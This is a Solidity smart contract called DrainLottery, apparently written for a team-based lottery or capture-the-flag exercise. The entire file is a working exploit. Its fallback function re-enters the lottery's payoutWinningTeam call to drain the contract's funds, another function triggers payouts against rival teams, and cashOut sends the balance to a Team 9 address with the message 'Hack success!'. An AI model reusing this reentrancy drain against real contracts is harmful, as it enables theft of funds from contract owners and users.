// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.7.0 <0.9.0;

import "@openzeppelin/contracts/access/Ownable.sol";

address constant LotteryAddress = 0x44962eca0915Debe5B6Bb488dBE54A56D6C7935A;
address constant Team9Address = 0x971ed3B1D66A445d20e75EdE714e64f00e9cAFF8;

interface ILottery {
    function payoutWinningTeam(address) external returns (bool);
}


/**
 * @title DrainLottery
 * @dev 
 */
contract DrainLottery is Ownable {
    function drain() public {
        ILottery(LotteryAddress).payoutWinningTeam(address(this));
    }

    function setOtherTeamPointsToZero(address _otherTeam) public {
        require(_otherTeam != Team9Address, "You can't stop TEAM 9!");
        ILottery(LotteryAddress).payoutWinningTeam(_otherTeam);
    }

    fallback() external payable {
        drain();
    }

    function cashOut() public {
        Team9Address.call{value: address(this).balance}("Hack success!");
    }

}
